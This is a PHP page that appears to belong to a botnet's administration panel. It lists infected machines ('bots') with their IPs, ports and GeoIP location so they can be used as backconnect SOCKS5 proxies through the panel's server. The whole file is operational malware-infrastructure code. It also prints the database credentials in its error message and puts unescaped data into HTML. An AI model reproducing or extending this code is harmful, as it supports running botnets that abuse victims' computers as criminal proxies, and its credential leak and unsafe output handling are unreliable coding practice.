<?
	include_once "../common.php";
	include_once ROOT_PATH."/mod/functs.php";
	if( !$user->Check() ) exit;

	Error_Reporting (E_ERROR | E_PARSE);	
	
	$icfg = $db->GetConfigs();
	$host = $icfg['bc_host'];
	$user = $icfg['bc_user'];
	$password = $icfg['bc_password'];
	$db_ = $icfg['bc_db'];
	$table = $icfg['bc_table'];

	$socks_check_geoip = (int)$icfg['bc_show_geoip'];
	$show_bots_ip = (int)$icfg['bc_show_bots_ip'];
	$cols = 4;
	
	if($show_bots_ip) 
	{
		$cols++;
		$smarty->assign('SHOW_BOTS_IP', $show_bots_ip);
	}
	
	$smarty->assign('HOST', $icfg['bc_server_ip']);
	
	$cs = 4;
	if ($socks_check_geoip)
	{
		$cols++;
		$smarty->assign('GEOIP', "<th width='150px' style='background: rgb(80,80,80); color: rgb(232,232,232);'>GeoIP !nfo</th>");
		$cs++;
	}
	$smarty->assign('COLS', $cols);
		
	$db2 = new mysqli($host, $user, $password, $db_);
	
	if ( !is_object($db2) || !$db2->ping() ) 
	{
		die("<font class='error'>Connect failed</font> : ".$db2->connect_error."<br>$host:$user:$password:$db_");
	}	

	$sql = "SELECT botname, use_port, info, ip FROM $table WHERE module_type = 1";

	$rs = $db2->query($sql);

	if (@$rs)
	{
		if ($db2->affected_rows)
		{
			$RES = array();
			for ( $i = 0; list($guid, $port, $info, $ip) = $rs->fetch_row(); $i++ ) 
			{
				$elem = array('I'=>$i, 'GUID'=>$guid, 'HOST'=>$icfg['bc_server_ip'], 'PORT'=>$port, 'IP'=>$ip);
		
				if ($socks_check_geoip)
				{
					list($country, $state, $city) = preg_split('[ / ]', $info);
					$country_flag = "<img src='img/flags/" . $country . ".gif' title='" . $country . "'>";
					$geoinfo = "$country_flag:$country:$state:$city";
					$elem['GEOINFO'] = "<td align='left'>$geoinfo</td>";
				}
				$RES[] = $elem;
			}
			$smarty->assign('CONT_ARR', $RES);
		}
	}
	else
	{
		die("<font class='error>ERROR</font> : Table is not exists ? ( $sql )");
	}
	
	$smarty->display('socks5.tpl');
?>